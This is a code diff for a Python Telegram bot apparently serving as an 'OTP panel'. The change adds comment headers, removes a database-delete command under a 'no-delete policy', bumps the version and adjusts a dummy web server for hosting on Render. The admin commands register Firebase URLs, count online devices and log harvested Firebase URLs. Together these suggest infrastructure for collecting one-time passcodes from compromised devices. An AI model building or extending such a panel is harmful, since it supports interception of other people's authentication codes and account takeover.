@@ -2308,6 +2635,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await wait.edit_text(f"📢 <b>BROADCAST DONE</b>\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode="HTML")
         return True
 
+    # ── /msg USER_ID MESSAGE ───────────────────────────────
     if cmd == "/msg":
         if len(args) < 2 or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/msg USER_ID Your message</code>", parse_mode="HTML")
@@ -2323,6 +2651,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             await reply(f"❌ Failed: {e}")
         return True
 
+    # ── /adddb NAME URL ────────────────────────────────────
     if cmd == "/adddb":
         urls = extract_firebase_urls(" ".join(args)) or extract_urls(" ".join(args))
         if len(urls) > 1:
@@ -2359,6 +2688,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             await reply(f"⚠️ Fetch failed: {e}")
         return True
 
+    # ── /listdb ────────────────────────────────────────────
     if cmd == "/listdb":
         lines = [f"🗄 <b>DATABASES ({len(DATABASES)})</b>", "━━━━━━━━━━━━━━━━━━"]
         for i, (name, url) in enumerate(DATABASES.items(), 1):
@@ -2369,6 +2699,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(text, parse_mode="HTML", disable_web_page_preview=True)
         return True
 
+    # ── /count ─────────────────────────────────────────────
     if cmd == "/count":
         total = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
         online = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == "online")
@@ -2381,6 +2712,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             parse_mode="HTML")
         return True
 
+    # ── /viewdb ────────────────────────────────────────────
     if cmd == "/viewdb":
         if not os.path.exists(FIREBASE_LOG_FILE):
             await reply("📭 firebase.txt does not exist yet.")
@@ -2396,38 +2728,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             await reply(f"❌ Failed to send file: {e}")
         return True
 
-    if cmd == "/deldb":
-        if not args:
-            await reply("⚠️ Usage: <code>/deldb URL</code>", parse_mode="HTML")
-            return True
-        target = args[0].strip().rstrip("/")
-        removed_pub = []
-        for name, u in list(DATABASES.items()):
-            if u.rstrip("/") == target:
-                del DATABASES[name]
-                GLOBAL_DEVICE_CACHE.pop(name, None)
-                GLOBAL_DEVICE_CACHE_TS.pop(name, None)
-                removed_pub.append(name)
-        # also remove from any user's private list
-        removed_priv = 0
-        for uid, dbs in list(PRIVATE_DBS.items()):
-            new = [p for p in dbs if p["url"] != target]
-            if len(new) != len(dbs):
-                removed_priv += len(dbs) - len(new)
-                PRIVATE_DBS[uid] = new
-                if not new:
-                    PRIVATE_DBS.pop(uid, None)
-        if not removed_pub and not removed_priv:
-            await reply("❌ URL not found in any database (public or private).")
-            return True
-        msg = "✅ <b>DELETED</b>\n"
-        if removed_pub:
-            msg += f"🗄 Public DBs removed: {', '.join(removed_pub)}\n"
-        if removed_priv:
-            msg += f"🔐 Private entries removed: {removed_priv}\n"
-        await reply(msg, parse_mode="HTML")
-        return True
-
+    # ── /clones ────────────────────────────────────────────
     if cmd == "/clones":
         if not CLONES:
             await reply("ℹ️ No clone bots.")
@@ -2447,6 +2748,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply("\n".join(lines), parse_mode="HTML")
         return True
 
+    # ── /kill TOKEN ────────────────────────────────────────
     if cmd == "/kill":
         if not args:
             await reply("⚠️ Usage: <code>/kill BOT_TOKEN</code>", parse_mode="HTML")
@@ -2460,6 +2762,9 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         del CLONES[token_to_kill]
         await reply(f"✅ Killed @{clone_data.get('username','unknown')}", parse_mode="HTML")
         return True
+
+    # ── REMOVED: /deldb  (no-delete policy) ────────────────
+    # Command intentionally absent. Any attempt returns "Unknown command".
 
     return False
 
@@ -2581,7 +2886,7 @@ async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         pass
 
 # ════════════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER  (v3.6 keyboard)
+#  TEXT MESSAGE HANDLER
 # ════════════════════════════════════════════════════════════
 
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -3164,16 +3469,16 @@ async def poll_loop(app: Application) -> None:
 # ════════════════════════════════════════════════════════════
 #  DUMMY WEB SERVER FOR RENDER
 # ════════════════════════════════════════════════════════════
+
 async def handle(request):
     return web.Response(text="Bot is running! This is a dummy server for Render.")
+
 
 async def start_web_server():
     app = web.Application()
     app.add_routes([web.get('/', handle)])
     runner = web.AppRunner(app)
     await runner.setup()
-    
-    # Render environment variable PORT set karta hai
     port = int(os.environ.get("PORT", 8080))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
@@ -3188,8 +3493,8 @@ def main() -> None:
         raise SystemExit("❌ TOKEN missing!")
 
     print("═" * 56)
-    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION v3.6 PREMIUM")
-    print("  🚀 Private OTP (unlimited, no-delete) · /recent · firebase.txt")
+    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION v3.7 PREMIUM")
+    print("  🔒 No-delete policy · 🌐 /activeurls download · firebase.txt")
     print("  🌐 Dummy Web Server for Render Enabled")
     print("═" * 56)
 
@@ -3211,7 +3516,6 @@ def main() -> None:
                 except Exception as e:
                     tlog(f"Failed to restart {clone_token}: {e}")
 
-        # यहाँ वेब सर्वर और आपके लूप्स स्टार्ट हो रहे हैं
         asyncio.create_task(start_web_server())
         asyncio.create_task(poll_loop(application))
         asyncio.create_task(auto_save_loop())
@@ -3239,6 +3543,7 @@ def main() -> None:
     print("🚀 Starting polling…")
     app.run_polling(drop_pending_updates=True,
                     allowed_updates=Update.ALL_TYPES)
+
 
 if __name__ == "__main__":
     main()
